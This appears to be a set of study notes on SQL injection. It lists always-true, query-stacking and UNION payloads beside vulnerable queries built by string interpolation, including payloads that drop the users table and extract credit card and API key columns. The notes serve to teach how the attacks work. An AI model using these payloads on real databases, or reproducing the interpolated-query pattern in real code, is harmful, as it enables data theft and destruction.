### Always true attack
SELECT * FROM users where userId = 'JAY';

SELECT * FROM users where userId = 'JAY' OR 1=1;

### Query Stacking attack

SELECT * from books where bookId = 1;

SELECT * from books where bookId = 1; DROP users;

### Union Attack
SELECT name, age from users;
// Will give you api key, or cc info



### Injection Attacks
`
    SELECT id, username, is_admin, email 
    FROM users 
    WHERE username = '${username}' 
    AND password = '${password}'
  `;


SELECT id, username, is_admin, email 
FROM users 
WHERE (username = 'alice') OR ('1'='1' AND password = 'XYZ');

(username = 'alice') OR (true AND false)

(username = 'alice') OR false

username = 'alice'

SELECT id, username, is_admin, email 
FROM users where username = 'alice'


### Query Stacking Attack

INSERT INTO blog_posts (id, title, content) VALUES (${id}, '${req.body.title}', '${req.body.content}');

INSERT INTO blog_posts (id, title, content) VALUES (2, 'Blog 2', 'test'); DROP TABLE users; --'); // -- stands for comment


### Union / Data Exfilteration Attack

SELECT username, email 
FROM users 
WHERE username = '${username}';

SELECT username, email 
FROM users 
WHERE username = 'admin' 
UNION 
SELECT credit_card, api_key 
FROM users 
WHERE '1'='1';